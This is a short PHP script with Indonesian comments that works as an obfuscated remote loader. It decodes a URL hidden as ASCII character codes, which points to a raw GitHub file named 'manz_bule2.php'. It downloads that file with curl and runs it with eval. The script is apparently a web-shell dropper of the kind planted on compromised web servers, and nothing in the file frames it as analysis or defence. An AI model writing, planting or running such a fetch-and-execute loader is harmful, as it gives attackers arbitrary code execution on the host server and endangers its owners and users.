<?php

$encoded = '104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,78,111,111,98,84,101,99,104,111,47,119,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,109,97,110,122,95,98,117,108,101,50,46,112,104,112';

// Decode ASCII ke URL
$url = implode('', array_map('chr', explode(',', $encoded)));

// Ambil isi file dari URL pakai curl
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$code = curl_exec($ch);
curl_close($ch);

// Jalankan kode PHP-nya
eval('?>'.$code);
?>